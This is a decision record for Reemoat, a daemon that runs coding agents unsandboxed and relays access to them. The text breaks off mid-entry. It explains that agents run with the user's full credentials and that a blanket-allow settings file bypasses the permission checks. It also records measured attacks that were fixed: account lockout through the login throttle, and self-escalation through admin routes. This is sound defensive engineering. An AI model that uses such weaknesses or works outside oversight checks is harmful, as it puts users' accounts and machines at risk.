# Reemoat — decision record

Why this system is built the way it is, as a set of questions and the answers it
arrived at.

Reemoat is a daemon that owns coding-agent sessions — `claude`, `kimi` or
`codex`, spawned over ACP (Agent Client Protocol) — and exposes them over HTTP and
WebSocket; a control plane that issues identity and relays every request to
them; and a web UI that supervises the whole fleet from a phone. One person, one
machine, many agents, and no sandbox.

## What this document is

A decision record, not a manual. `CLAUDE.md` states the rules as they stand and
is what you need in order to *change* the code. This file answers the other
question — **why is it like that** — and it exists because that answer was
otherwise being carried in prose at the top of the codebase, where it cost more
to read than it returned.

Every entry is a question somebody actually had to answer, with the reasoning
that settled it. Where a decision rests on a measurement, the measurement is
quoted with its date and the version it was taken against, because an
observation about `claude-agent-acp` 0.63.0 is not a fact about ACP.

## How to read an entry

Entries are numbered `Q<group>.<n>` and grouped by area. The fields vary by what
kind of thing is being recorded:

| Field | Means |
|---|---|
| **Decision** / **Rule** / **Behaviour** / **Position** | What is true now. `Rule` marks a constraint that was a defect first; `Behaviour` marks a fact about a third-party tool rather than a choice. |
| **Why** | The reasoning — above all, the concrete failure the decision prevents. |
| **Measured** | An observation, with its date and the versions it was taken against. |
| **Rejected** | An alternative that was considered, or built and removed, and why it lost. |
| **Status** | `Current`, `Known limitation`, `Not built`, `Deliberate non-goal`, or `Reversed an earlier decision`. |

Three conventions are worth knowing before you start:

**Rejected alternatives are kept.** Several things here were built, measured and
taken back out. Those entries are the most useful ones in the file: they are the
only record of why an obvious-looking idea does not work, and without them the
same idea gets rebuilt.

**Known limitations are labelled, not smoothed over.** Where something is broken
and not fixed, the entry says so. Where a claim in an earlier version of this
material turned out to be wrong, the correction is recorded rather than quietly
swapped, because a reader who reached for the old claim deserves to know it
moved.

**Names are cited by symbol, never by line number.** Line numbers rot; a symbol
you can `grep` for does not. If a name in this file greps to nothing, that is a
bug in the file.

## Groups

| Group | Covers | Entries | Heading |
|---|---|---:|---|
| [**Q1**](#identity-reachability-and-trust) | Identity, reachability, and what is deliberately not confined | 110 | `###` |
| [**Q2**](#session-lifecycle-questions-and-attachments) | Session lifecycle, restart and resume, questions the agent asks, attachments | 70 | `###` |
| [**Q3**](#the-web-client) | The web client — the list, the transcript, the composer, the ask card | 197 | `####` |
| [**Q4**](#deployment-packaging-and-code-layout) | Deployment, packaging, and code layout | 44 | `###` |
| [**Q5**](#invariants--rules-that-were-defects-first) | Invariants — rules that were defects first — and every bound in one table | 102 | `####` |
| [**Q6**](#measured-behaviour-of-the-agents-and-the-tools) | Measured behaviour of the agents and of git, node and HTTP/2 | 64 | `###` |
| [**Q7**](#open-questions-and-deliberate-non-goals) | Open questions and deliberate non-goals | 106 | `###` |
| | | **693** | |

**The two largest groups are one level deeper, and counting only `###` is how the
number comes out wrong.** Q3 and Q5 sit at `####` because each subdivides further
with `###` dividers of its own (`### The relay`, `### Tokens and authentication`,
and five more); promoting their entries would make them siblings of their own
dividers. So the count is over **both** depths, and it says 693 rather than the 394
that reading one depth gives — a number that had been restated, and drifted, fifteen
times before `docscheck` started asserting it against the real headings. It asserts
this sentence too, both halves of it, for the same reason.

## Provenance

This was assembled from a single long-form engineering document that grew
alongside the code between 2026-07 and 2026-08. Reshaping it into questions did
not add or remove engineering content, but **this file is now the only copy**:
the repository was published with fresh history, so there is no earlier revision
to go back to and no commit to cite. Where an entry names an incident it names it
in words, for the same reason.

Measurements throughout were taken against `claude-agent-acp` 0.63.0 with
`claude` 2.1.220, `kimi` 0.29.2, `codex-acp` 1.1.9, and — where the ACP reference
implementation is cited — `gemini-cli` 0.53.0. Where a version matters to the
conclusion, the entry names it.

---
## Identity, reachability and trust

### Q1.1 — What is Reemoat, and where do the agents actually run?

**Decision.** A daemon owns coding-agent sessions and exposes them over HTTP + WS;
a control plane issues identity and relays every request to them; a web UI
supervises all of it from a phone. The daemon runs on your own machine and spawns
agents as children of itself, as you — several at once, each in its own git
worktree, each able to bring up a dev server and run what it just wrote.

**Why.** One person, one machine, many agents, and no sandbox. Spawning an agent
as a child of the daemon under your own uid is the same thing that happens when
you type `claude` in a terminal, except that you can be somewhere else. Separate
worktrees are what stop concurrent agents fighting over one index and one HEAD.

**Status.** Current

### Q1.2 — Why was the container-per-tenant model abandoned rather than kept?

**Decision.** The multi-tenant model — a host directory per *tenant*, a long-lived
container it was mounted into, and a grant — is abandoned rather than superseded.

**Why.** It was coherent and it bought real things: kernel namespaces, cgroup
limits, a defence against somebody you do not trust at all. It is gone because the
product no longer asks the question it answered. What it cost was everything a
container is in the way of: ports, tooling, the host's own caches, and the ability
to look at what you built. See **What is not confined** (Q1.14–Q1.19) for the
trade in the other direction, which is not a small one.

**Status.** Reversed an earlier decision

### Q1.3 — If tenancy is gone, what does "multi-user" mean now?

**Decision.** Multi-user moved rather than disappeared. The control plane still
holds several people, each with their own machine and a grant on it; a fleet of
one-person daemons is what "multi-user" now means. The daemon accepts any token
whose `aud` is its own machine id and stops asking who the subject is.

**Why.** Nothing extra had to be written for the fleet case — the audience check
already carries it.

**Status.** Current

### Q1.4 — What does the network layer assume about clients?

**Decision.** The daemon spawns `claude`, `kimi` or `codex` over ACP (Agent Client
Protocol), normalizes all three into one event union, and puts that behind a network
layer built on the assumption that **clients are unreliable**. The daemon is the
source of truth and the agent must never notice a client leaving.

**Why.** A laptop lid closes, a phone drops to LTE, a tab is discarded. Any of
those must be invisible to the running agent.

**Status.** Current

### Q1.5 — What is the build, and what compiles?

**Decision.** Node >= 24, ESM, TypeScript strict. Everything in `src/`, `scripts/`
and `packages/control-plane` runs straight off `tsx` with no build step.
`packages/web` is the one exception and is bundled by Vite — inside the control
plane's image, which is the only thing in this repository that compiles anything.

**Why.** No build step keeps the daemon and the control plane runnable directly
from source; the web bundle is the single artifact that genuinely needs one.

**Status.** Current

### Q1.6 — With no test framework, what is the automated safety net?

**Decision.** `pnpm typecheck`, `authcheck`, `daemoncheck`, `relaycheck`,
`webcheck`, `pincheck`, `deploycheck`, `docscheck`, `imagecheck` and `harness` are
the whole automated safety net, and they are drivers rather than unit tests on
purpose. Eight are runnable offline in a single process with no fleet, no agent and
no deploy; two are not, in different directions. `harness` drives a real agent and
needs a login CI cannot hold, so it is excluded. `imagecheck` builds a container
image and starts it, so it needs a Docker daemon and a network, which is why it is
a *separate job* in `.github/workflows/check.yml` rather than a step beside the
others. Everything except `harness` runs in CI.

**`docscheck` is the newest, and the only one whose subject is prose.** It holds
`CLAUDE.md` to a budget and each rule file to a smaller one, resolves every
`Q<group>.<n>` citation against a real heading, greps every symbol *this* file
cites, checks the Groups table and the totals stated around it against the real
headings, and checks every `paths:` glob against a real file. It exists because the
last cut of `CLAUDE.md` installed no number and no check, only two qualitative
sentences, and the file was larger six days later — the same reason the entry count
in this document is asserted rather than restated.

**Why.** `imagecheck` earns its exception: the control plane reaches into the
repository root for exactly four files by literal relative path, and a fifth import
passes `typecheck` and every other driver while breaking only the image.

**Measured.** Four files reached by literal relative path from the repository
root; a fifth import that passes `typecheck` and every other driver and breaks
only the image.

**Status.** Current

### Q1.7 — Does running the checks deploy anything?

**Decision.** Deploying is a *separate* act from checking, and nothing automates
it.

**Why.** The checks say the tree is sound; they do not decide when a running
machine is disturbed.

**Status.** Current

### Q1.8 — How does the daemon decide who is asking?

**Decision.** `REEMOAT_AUTH` picks the mode: `shared_secret` (the default,
unchanged, with no control plane anywhere), `signed`, or `both`.

**Why.** The shared-secret path has to keep working with no control plane in the
picture at all; signing is what a fleet needs.

**Status.** Current

### Q1.9 — Why does the daemon never contact the control plane after enrollment?

**Decision.** Under `signed` the daemon verifies Ed25519-signed tokens against a
public key it obtained **once**, at enrollment, and **never contacts the control
plane again**.

**Why.** That is the load-bearing property: a control-plane outage cannot stop a
session, cannot stop a daemon starting, and cannot stop a token verifying.

**Status.** Current

### Q1.10 — Is the control plane on the data path?

**Decision.** **The control plane is on the data path, always.** Every request to
every machine goes down the tunnel its daemon dialled out. The daemon is never
**asked** anything: no key is fetched, no revocation list polled, no token
validated over the tunnel.

**Why.** An outage there stops you reaching your machine and cannot stop a session
running, a token verifying, or a daemon starting.

**Rejected.** The text that used to sit here said the control plane was *not* on
the data path, and then that it was a *fallback*. Both are gone; the half that
survives every rewrite is the careful one.

**Status.** Reversed an earlier decision

### Q1.11 — What does a grant entitle somebody to?

**Decision.** **A grant is full access to the machine.** Anybody granted a machine
sees all of the work on it.

**Why.** `owner_subject` used to partition every route, so a grant let somebody see
their own sessions on a machine and nothing else. That filter is gone with the
tenancy: there is one person's work on a machine. Under the old model this was a
tenancy question; it is now the whole authorization model, which is why it is
stated here rather than in a footnote.

**Status.** Reversed an earlier decision

### Q1.12 — How quickly does revoking a grant take effect?

**Decision.** **Revocation is immediate.** The relay reads live user, machine and
grant rows before a byte enters the tunnel, so revoking a grant takes effect on the
*next request*. What the token lifetime still bounds is one thing: a WebSocket
already open, which the daemon closes `4401` on its own ping tick at
`exp + leeway` — five minutes by default, six with leeway.

**Why.** The earlier claim — no revocation list, blast radius exactly one token
lifetime — was true only while a client could reach a daemon directly, which is
precisely the path nothing could revoke.

**Status.** Reversed an earlier decision

### Q1.13 — Where does the control plane live, and may `src/` import from it?

**Decision.** The control plane lives in `packages/control-plane`, with its own
SQLite and its own entry point. It signs tokens, holds users, machines and grants,
mints single-use enrollment codes, and relays. **Nothing in `src/` may ever import
from it.**

**Why.** The dependency runs one way only; the daemon must remain buildable and
runnable with no knowledge of the control plane's internals.

**Status.** Current

### Q1.14 — What is an agent confined to?

**Decision.** Nothing. **An agent runs as you.** It is a child of the daemon
process, with your uid, your `HOME`, your files, your `~/.ssh`, your browser
profile and your other repositories. `cwd` is not confined, `REEMOAT_ROOTS`
narrows the directory *picker* and nothing else, and the ACP `fs` capabilities are
granted.

**Why.** `REEMOAT_AUTH` decides *who* is asking; nothing decides what they can
reach, and that is said here rather than left to be discovered. Declining the `fs`
capabilities would confine nothing — the agent could make the same read itself.
This is the same trade every coding agent on a laptop already makes. The difference
this daemon adds is that it can be driven from a phone, over a relay, by anybody
holding a grant on the machine.

**Status.** Current

### Q1.15 — What happened to the isolation layer?

**Decision.** The container per person, the bind-mounted home, the cgroup limits,
the mount namespace and the `owner_subject` filter on every route are all gone.

**Why.** It was not wrong; it answered a question — "how do I serve somebody I do
not trust" — that this product stopped asking.

**Status.** Reversed an earlier decision

### Q1.16 — What does `agentEnv()` actually protect against?

**Decision.** **The agent inherits this process's environment.** `agentEnv()`
strips the session-scoped `CLAUDE_*` names and everything beginning `REEMOAT_`,
and that is **hygiene, not a fence**.

**Why.** The agent runs as this uid and can read `/proc/<pid>/environ`, the env
file and `REEMOAT_DB` itself. What the strip prevents is three accidents rather
than an attack: an agent running `env` and pasting the output into a transcript
that lands in the log, in the UI and in a bug report; an agent running `pnpm
daemon` and colliding on the daemon lock; and `REEMOAT_TOKEN` reaching a
subagent's context window.

**Status.** Current

### Q1.17 — Do a repository's own git hooks run?

**Decision.** **Git hooks run as you again, and that is the intent.**
`GIT_NO_EXEC_CONFIG` is deleted, so `git worktree add` runs the repository's own
`post-checkout` and its LFS smudge filters.

**Why.** Cloning a hostile repository is therefore exactly as dangerous here as in
your own terminal — which is to say: exactly as dangerous, and no more. The hooks
were neutralised while the repository was on the other side of a boundary, and the
cost of keeping that was silent: a blanked `GIT_CONFIG_GLOBAL` checks out LFS
pointer files instead of content, and the agent reads a spec URL where a binary
should be.

**Status.** Reversed an earlier decision

### Q1.18 — Can the permission machinery be bypassed entirely?

**Decision.** Yes. **`~/.claude/settings.json` can bypass the permission machinery
entirely.** Where it blanket-allows `Bash`, `Edit` and `Write`, the inner CLI
decides for itself and the permission state machine this daemon is built around
never sees a request.

**Why.** This sat in **Known gotchas** as a testing inconvenience; under the
current trust model it is a product fact, and it belongs with the security
posture.

**Measured.** On the development machine, `~/.claude/settings.json` blanket-allows
`Bash`, `Edit` and `Write`.

**Status.** Current

### Q1.19 — If a sandbox is wanted again, where would it go?

**Decision.** The seam is `SessionRuntime`. It is kept as an interface with one
implementation for exactly that reason.

**Why.** Re-adding confinement should be filling in an implementation rather than
reopening a design.

**Status.** Not built

### Q1.20 — How does a browser reach a daemon behind NAT?

**Decision.** The control plane also runs a **relay**, on its own port, and **it is
the only way in.** A daemon dials out over WSS at startup and holds one connection;
every request from every client is spliced onto it. The daemon binds `127.0.0.1`,
the registry records no address for it, and there is nothing else to address.

**Why.** Identity without reachability is not a product: daemons sit behind NAT and
the browser is outside.

**Status.** Current

### Q1.21 — Why was the direct path deleted rather than made optional?

**Decision.** **The direct path is deleted, not disabled.** `REEMOAT_HOST`
defaults to `127.0.0.1`, and the `baseUrl` column is gone rather than merely left
null.

**Why.** A machine's `baseUrl` used to be its whole routing policy — with one,
clients probed it first and a client on the same LAN never touched the relay;
without one, the relay was the only path. That was a good design for a fleet of
machines other people might reach directly, and `--no-url` was how you turned it
off. It was also never the *lever* it looked like: the daemon went on listening on
every interface regardless, and a client that had already memoised a direct route
went on using it. **Loopback binding is the lever.**

**Rejected.** `--no-url` / a null `baseUrl` as the opt-out, because it did not
change what the daemon bound to or what an already-memoised client did.

**Status.** Reversed an earlier decision

### Q1.22 — Does `REEMOAT_PORT` still matter if nothing outside dials it?

**Decision.** `REEMOAT_PORT` stays known and stays 7887. `REEMOAT_PORT=0` still
works for a daemon only ever served by the relay.

**Why.** The things that address the port are on the same machine: `pnpm client`
under the shared secret, and the deploy script's `/health` probe. With `0`, the
relay routes by the verified `aud` claim and splices each CONNECT to a fresh
loopback connection — nothing outside needs to know the port.

**Status.** Current

### Q1.23 — Can a deployment opt out of the relay?

**Decision.** No. `REEMOAT_CP_RELAY_URL` is **required** — `main.ts` refuses to
start rather than pretend otherwise — and `REEMOAT_RELAY=0` on the daemon is
gone. Both are warned about rather than ignored when left in an old environment
file.

**Why.** A control plane without a relay is a fleet nobody can reach, and opting
out of the relay is opting out of being reachable, which is not a configuration.

**Status.** Current

### Q1.24 — What does the relay do that ngrok or Cloudflare Tunnel cannot?

**Decision.** **Authorization is the point, and it is now the *whole* point.** The
relay verifies the caller's signed token and checks their grant *before a byte
enters the tunnel*, against live rows — so revoking a grant takes effect on the
next request.

**Why.** ngrok and Cloudflare Tunnel already move bytes; what they cannot do is
know that user X may reach machine Y. The cost is stated where it will be read: the
control plane is now permanently on the data path, and an outage there costs *all*
reachability where it used to cost nothing. What it still cannot touch is anything
already running (Q1.9, Q1.10).

**Rejected.** The earlier framing of two paths with different revocation windows,
the direct one bounded by token lifetime. There is one path, and it is the
revocable one.

**Status.** Current

### Q1.25 — How does one tunnel carry many connections?

**Decision.** HTTP/2 over the WebSocket, one `CONNECT` stream per browser
connection, spliced on the daemon side to a fresh loopback connection to its own
listener.

**Why.** The tunnel therefore carries **opaque bytes, not parsed HTTP**, which is
why tunneling a WebSocket inside a WebSocket needed no special case and why nothing
in `server.ts`, `session.ts` or `registry.ts` changed.

**Status.** Current

### Q1.26 — What does the `requestsProxied` counter measure?

**Decision.** `cpctl admin relay` shows a per-tunnel `requestsProxied` counter; it
is plain traffic accounting.

**Why.** It used to be the measurement that made "it went direct" a fact rather
than a claim. With one path there is nothing left to prove.

**Status.** Current

### Q1.27 — How do agent credentials get onto disk at all?

**Decision.** Two paths put them there: a pasted token (Q1.29) and a wizard that
drives the agent's own login under a pty (Q1.31). The daemon never calls ACP's
`session/authenticate`.

**Why.** `acp/agents.ts` still says the true thing — both agents authenticate out
of band and the daemon can only inherit credentials from disk. So something has to
put credentials on that disk.

**Status.** Current

### Q1.28 — Why does a login feature survive the move off tenants?

**Decision.** It stays, with a different justification.

**Why.** It existed because a tenant had no shell on the host; on your own machine
`claude auth login` in a terminal is the whole answer and always was. What it
exists for now is the case this entire product exists for: **you are not sitting at
the machine.** From a phone there is no terminal, and a login is exactly the thing
you need when an agent has just refused a prompt.

**Status.** Current

### Q1.29 — What is stored when somebody pastes a token?

**Decision.** Path A stores `agent_credentials(agent, env_name, secret,
updated_at)`, merged into the agent's environment at spawn. Secrets are merged
*last*, so a pasted token beats an ambient one.

**Why.** What a credential *is* is the name of the variable the CLI reads it from —
`CLAUDE_CODE_OAUTH_TOKEN` (what `claude setup-token` mints), `ANTHROPIC_API_KEY`,
`KIMI_API_KEY` — so the name is stored beside the value and nothing else has to
know any of them. Merging last is what makes the Settings screen's "set" true about
what the agent will actually read.

**Status.** Current

### Q1.30 — Does pasting a key work for kimi?

**Decision.** Yes, on one of kimi's two credential paths, and the contradiction
this entry used to record is **answered**: both statements were right about
different code.

**Measured** against the installed kimi 0.29.2. Its raw model client reads the
process environment — `options.apiKey ?? process.env["KIMI_API_KEY"]` — so
`AGENT_LOGIN.kimi.envNames` is real. Its **provider manager**, which is the path a
`managed:kimi-code` provider takes, resolves the key from `provider.env`, a TOML
table in `~/.kimi-code/config.toml`, and never consults `process.env` at all — so
`resolveAgent`'s `authHint` was right too.

**Why neither side could win by reading harder.** They were describing different
call sites of one CLI. Which one an installation is on is a fact about *its config
file*, not about kimi, and the honest rendering is to keep the slot and stop the
hint claiming it is useless.

**Status.** Current

### Q1.40 — Does the pty get a stdin pipe?

**Decision.** Only where the flow reads one, and on BSD only.
`AGENT_LOGIN[agent].interactiveStdin` says which, and `loginStdio(platform,
interactive)` turns it into the `stdio[0]` for the spawn.

**Why.** It fixes the macOS defect — the login wizard did not run there for *any*
agent — for two of the three. BSD `script` reads its own
stdin's termios in order to copy it onto the pty it is allocating, so a pipe makes
it exit 1 before the agent is reached; `/dev/null` succeeds. Measured, `claude
auth login` waits on a paste prompt and needs the pipe, while `kimi login` and
`codex login --device-auth` are device-code flows whose input box was never used.

**Why Linux keeps its pipe unconditionally.** util-linux `script` works with one
today, an immediate stdin EOF is a plausible way for it to decide the session is
over, and Linux is where this deploys. There is nothing to buy by changing it.

**Confirmed on macOS 2026-08-08, both halves from one daemon**: `kimi login`
exited 0 with `Logged in to managed:kimi-code.`, `claude auth login` exited 1
with the `tcgetattr` line. What is still unmeasured is whether BSD `script`
survives a *full* device flow with `/dev/null` on stdin — that kimi was already
signed in, so it returned at once.

**What it costs.** `AgentProcess.stdin` is `Writable` and every session relies on
that, so login takes a narrower `LoginProcess` whose stdin may be `null` rather
than widening the common type. `POST /agent-auth/login/:id/input` answers `400
login_not_interactive` instead of the silent no-op it would otherwise be.

**Status.** Current

### Q1.41 — Is "can this agent be logged in here" one question or three?

**Decision.** Three, folded into `SessionRuntime.loginSupport(agent)`: `script` is
on PATH, that agent's CLI resolves, and whether its flow reads stdin.

**Why.** The daemon-wide `loginSupported` answered only the first. The adapter and
the CLI are different binaries — Q1.33 — so an agent whose CLI is missing is an
ordinary state, and it produced an enabled button and a `503 login_unsupported`
after the tap, with the reason only in the daemon's own log. That is precisely
what Q1.31 says `loginSupported` exists to prevent, reached by another door.

**Why the old field stays.** An older client reads it and nothing else.

**Status.** Current

### Q1.31 — Why does the login wizard need a pty?

**Decision.** Path B runs the agent's own login under a pty allocated by `script`,
via `hostLoginArgs`, which is pure so `daemoncheck` can assert both platforms from
a machine that is only one of them: util-linux takes the command as a shell string
(`script -qec "<cmd>" /dev/null`) and BSD takes it as argv
(`script -q /dev/null <cmd> <args>`).

**Why.** Both login flows are interactive terminal programs and will not prompt
without a pty, while a daemon's stdin is never a tty — the same fact that made
`docker exec -it` unusable from inside a daemon, now one layer down. Three things
follow that the container version could not have had: the command is now an
absolute path that may contain spaces and must be shell-quoted; macOS `script` has
no `-e` so it does not propagate the child's exit status, which is why the wizard
re-probes availability rather than trusting the code; and `script` may simply not
be installed, which is what `SessionRuntime.loginSupported` reports so the client
never draws a button that answers 503.

**Status.** Current

### Q1.32 — Can a caller name the program a login runs?

**Decision.** No. **The login command is a table lookup, never a request field.**
There is no route, body field or header anywhere that names a program to run.

**Why.** That was a tenant fence and it is still worth having for a different
reason: this daemon is reachable from the internet through the relay.

**Status.** Current

### Q1.33 — Is the binary a login drives the same one the daemon launches?

**Decision.** No. `available` is about `claude-agent-acp`, the ACP adapter, while
`loggedIn` and `login` are about `claude`. `resolveLoginBinary` reads
`CLAUDE_CODE_EXECUTABLE` first.

**Why.** `claude` ships inside a platform-specific package of the SDK with no `bin`
entry. Conflating the two is what made the old documented remedy unrunnable — the
adapter resolved perfectly and `claude` was not on PATH. And a login that wrote
credentials for a different build than the session reads is a login that appears to
work and changes nothing.

**Status.** Current

### Q1.34 — Why is a login driven over HTTP rather than the WebSocket?

**Decision.** **No new WebSocket.** Output is polled and input is an HTTP request
whose response confirms it landed.

**Why.** That is the read-only-WS invariant applied where it was written to apply:
a login code is sent once and is unrecoverable if it evaporates, which is exactly
what `ws.send()` into a half-open socket does.

**Status.** Current

### Q1.35 — How does an agent push?

**Decision.** An agent pushes with your `~/.gitconfig`, your credential helper and
your keys, exactly as you would. Nothing mediates it.

**Why.** `GIT_NO_EXEC_CONFIG` had to go for that sentence to be true: it cleared
`credential.helper` and `core.sshCommand` on every invocation, which is precisely
what would have made it false. Whether that is right or alarming depends entirely
on how much you trust what you are running, and it is the same answer as everything
else in **What is not confined** (Q1.14–Q1.19).

**Status.** Current

### Q1.36 — What happened to the forge feature?

**Decision.** There is no forge feature. `src/forge.ts` held a token per (tenant,
host) in SQLite, wrote a credential file into the container's writable layer, and
installed a per-host helper into the tenant's `.gitconfig`; all of it is gone.

**Why.** It existed because an agent in a container had no credentials of its own
and no way to be given any. An agent runs as you now.

**Rejected.** Keeping the section. What is *lost* with it is worth naming, because
it was good writing about real measurements: the symlink-redirect write primitive,
the `rm -f` → `set -C` → temp → `mv` sequence that defeats it, and "clearing writes
an empty file; it must never delete one". All correct, all about a container.

**Status.** Reversed an earlier decision

### Q1.37 — What is a login throttle keyed on?

**Rule.** A composed key, built only by `loginKey(name, address)`,
`addressKey(address)` and `passwordChangeKey(userId)` in `throttle.ts`. Never the
bare submitted name, which is what it was.

**Why.** Keyed on the name alone the defence was a **weapon**: anyone who could
reach the service could refuse a named person their own account, from anywhere,
with no credential. Pairing the name with the address means a block follows the
guesser rather than the name they typed, and being throttled still proves nothing
about whether the account exists — which is what lets the refusal be an honest
`429` instead of another indistinguishable `401`.

`passwordChangeKey` is namespaced on the *user id* because that route and the
login route shared one key space and one instance, so the remedy was blocked by
the attack it is the remedy for. Every builder is namespaced, including the login
one, and that is not decoration: the address half is caller-supplied, so with a
bare `<name>|<address>` a login naming `pwchg` and forwarding a user id writes
exactly the key a password change reads. `field()` also strips the separator, or
`a|b` at address `c` and `a` at address `b|c` are one counter.

**Measured.** Eleven unauthenticated `POST /v1/login` requests naming `ada` made
ada's own sign-in answer `429` **with the correct password**, and made her
password change answer `429` on a valid session. Sustaining it cost about eleven
requests every fifteen minutes. `relaycheck`'s "the lockout, which is the defect
this key composition exists for" is that sequence, asserted.

**Rejected.** The escape hatch the file used to claim — "somebody locked out of
the web UI still has `cpctl`" — was retired rather than relied on: a user created
today gets no API key at all, so it was only ever true of the bootstrap admin.

**Known limitation, stated at the constant rather than hidden.** Behind a reverse
proxy that does not set `x-forwarded-for`, every caller shares the proxy's socket
address, so `loginKey` degrades back toward one bucket per name and `addressKey`
toward a global counter; an office behind one NAT is the same shape with no proxy
at all. Where there *is* no proxy the header is caller-supplied and wins, so a
sprayer can mint a fresh bucket per request and can aim at somebody's real
address. Neither is a regression — today's key needs neither — and what the
composition buys is that a block is at worst as narrow as the address somebody
chose, instead of fleet-wide for a name anybody can type. An attacker spread
across many addresses is bounded by Q1.39, not by this file.

**Status.** Current

### Q1.38 — When is a failed attempt recorded, relative to the KDF?

**Rule.** Before the `await`, and un-recorded by `succeed()` if the password turns
out to be right.

**Why.** `check` is synchronous and `fail` used to run only *after* `await
verifyPassword`, so every guess that arrived inside one KDF window saw a counter
nothing had incremented yet. The throttle was therefore measuring the semaphore in
`password.ts` rather than the guesses. Recording optimistically closes the window
and costs nothing a wrong-then-right sequence did not already cost, because
forgetting the failures on success is `succeed`'s whole contract.

**Measured.** 40 concurrent guesses against one account reached **36** real
verifications, against a documented threshold of 5. After the change the number
that reaches the KDF is threshold + 1 — the request that trips the block passed
`check` before its own `fail` set it — and `relaycheck` asserts `<= 6` with the
old figure quoted in the report line.

**Rejected.** Making `check` and `fail` one call. The class already supports the
optimistic pattern, and a combined `checkAndFail` would have to answer for the
success path anyway; naming `succeed` as "what un-records one" was the smaller
change and is the sentence the docblock now leads with.

**Status.** Current

### Q1.39 — Why are there two hashing lanes rather than one gate?

**Rule.** `HashLane` is `"public" | "authenticated"`, required at every call with
**no default**. Four hashes may run at once; at most two of them may be public.
The wait lists are per lane — 32 authenticated, 16 public — and `release` wakes an
authenticated waiter first, unconditionally.

**Why.** The login route reaches the KDF on *every* request by design: an unknown
name verifies against the decoy so the timing says nothing (Q1's login-oracle
rule). So a spray of **distinct** names is a spray of real hashes, and no
per-identity threshold ever sees it — which is exactly the shape Q1.37's address
backstop exists for, and neither defence is sufficient alone. With one gate of
four, the remedy for the flood was denied by the flood.

The decoy takes the *same* lane as a real verification rather than being pinned to
`"public"` inside: time spent queued is time a caller can measure, so a decoy
waiting in one lane while a real verification waits in another would rebuild the
user oracle out of the defence against flooding — under load, and therefore
exactly when somebody is looking.

**Measured.** Before the split, 36 hashes in flight and every login *and* every
admin password reset answered `503 overloaded`. `relaycheck` sprays 40 distinct
names from 40 distinct addresses (both counters have to be missed for the spray to
reach the KDF at all) and asserts that an authenticated reset still completes
through it.

**Why the numbers are what they are.** Four is a **memory** bound, not a CPU one —
at N=2^15 each hash holds 32 MiB for its duration, so four is ~134 MiB peak and a
hundred simultaneous attempts would be 3.2 GB and a kill rather than a slowdown.
It is deliberately far below `UV_THREADPOOL_SIZE` (64), which is shared with
`serveStatic`: a gate at the pool's size would let a spray against this endpoint
stop the login *page* loading. The per-lane wait lists total 48 against 32 before,
which is the one place the split changes a number rather than only routing — a
shared list would let a spray fill it and refuse the password change anyway, i.e.
move the starvation one door along rather than close it.

**Cost, stated plainly.** Sign-in throughput is halved under no load at all, ~20
logins a second against ~40. Nobody reaches that on a fleet that is one person and
their machines.

**Status.** Current

### Q1.610 — Can an admin reset their own password without giving it?

**Rule.** No. `proveSelf` requires and verifies `currentPassword` whenever
`:id` is the caller's own, on **`POST /v1/admin/users/:id/password`** and **`POST
/v1/admin/users/:id/keys`** — the same question `POST /v1/me/password` has always
asked, in the same place, with the same throttle key and the same
`PasswordBusyError` → `503`. **Both routes are since deleted; see the supersession
at the end, and read the measurement rather than the rule.**

**Why.** Those two routes are `/v1/me/password` reached by another door, and they
carried nothing. `disable` and `delete` both have self-refusals; these had none.
So a session token lifted from an admin's tab converted into ownership of the
account in exactly one request — and the real owner was locked out, because the
reset revokes every session and (now) every key.

**Measured.** Driven against a real app: `/v1/me/password` correctly refused
without `currentPassword`, while `POST /v1/admin/users/<self>/keys` answered `201`
with a permanent key and `POST /v1/admin/users/<self>/password` reset the password
outright, both asking nothing.

**Rejected.** Refusing self outright, which was the obvious symmetry with
`cannot_disable_self`. It is wrong here: an admin resetting their own password
because they think it leaked is the ordinary case, and on the single-admin
deployment `install.sh` creates there is nobody else to ask.

**Consequence.** `POST /v1/admin/users/:id/keys` now reads a JSON body, which it
never did. Aimed at anybody else the body is ignored; the migration exception is
`/v1/me/password`'s, unchanged — a caller with no `user_passwords` row is allowed
through, because their API key was already full authority and requiring a password
they have never had would make the migration impossible rather than safe.

**Superseded — the guard became a deletion, which is the stronger form of the same
fix.** Q7.74 deleted both routes this entry guards, plus `withKey` on `POST
/v1/admin/users`, on the observation that this entry's "Rejected" paragraph had
already half-made: guarding an admin's door into somebody else's account still
leaves the door. The answer to the heading is now *there is no admin password
reset at all*, for anybody's account including your own; re-keying yourself is
`POST /v1/me/password`, and getting back in without the current password is the
mailed link at `POST /v1/reset`.

What survived is the question rather than the helper. `proveSelf` is gone;
`proveCurrentPassword` is what is left of it, and app.ts says so at the definition
— *"What is left of `proveSelf` after the two admin credential routes were
deleted"*. It asks the same thing with the same `passwordChangeKey(caller.userId)`
and the same `PasswordBusyError` → `503`, about **the caller** and never about a
parameter, on the two `/v1/me/*` routes that are now the escalation this entry
found: `POST /v1/me/keys` (minting a permanent credential from a borrowed session)
and `PUT /v1/me/email` (the address is the reset channel, so repointing it *is*
taking the account). `POST /v1/me/password` verifies inline, because it is also
the route that must let an account with no password row set a first one.

**The measurement above is the part worth keeping**, and it is why this is
superseded rather than deleted: `POST /v1/admin/users/<self>/keys` answered `201`
with a permanent key and `POST /v1/admin/users/<self>/password` reset the password
outright, both asking nothing. That is what those routes did on the day somebody
looked, and it is the evidence for removing them rather than hardening them.

**Status.** Superseded — both routes are deleted; the question moved to
`proveCurrentPassword` on `/v1/me/keys` and `/v1/me/email`

### Q1.611 — Can an API key be revoked?

**Rule.** Yes, now. `revokeApiKey` is the one *targeted* write, behind `DELETE
/v1/me/keys/:keyId` and `DELETE /v1/admin/users/:id/keys/:keyId`; `POST
/v1/admin/users/:id/password` sweeps the account's keys as well. Two `UPDATE
api_keys` statements, three routes — and `POST /v1/me/password` is deliberately
not one of them. **The sweep and its route are since deleted, which takes the
count to one statement and two routes; see the supersession at the end.**

**Why it is here at all.** `callerAuth` read `api_keys.revoked_at` and answered
`api_key_revoked`, so from both ends the capability looked present — the schema
has the column, the middleware honours it — while there was **no `UPDATE
api_keys` anywhere in the service**: three INSERTs, one SELECT, and a DELETE
inside user deletion. A key was therefore immortal until the account holding it
was deleted outright, which on a single-admin deployment means a leaked admin key
had no in-band remedy at all. This is the failure `sessionOf` is named for, in the
other direction: **a property the code appears to have and nothing enforces is
worse than one it visibly lacks**, because the reader stops looking.

**Why an *admin* reset takes the keys with it and a self-service change does
not.** `POST /v1/admin/users/:id/password` exists precisely for the case where
somebody else may hold the account, so a reset that leaves a permanent,
never-expiring credential in place has handed the account back to whoever has that
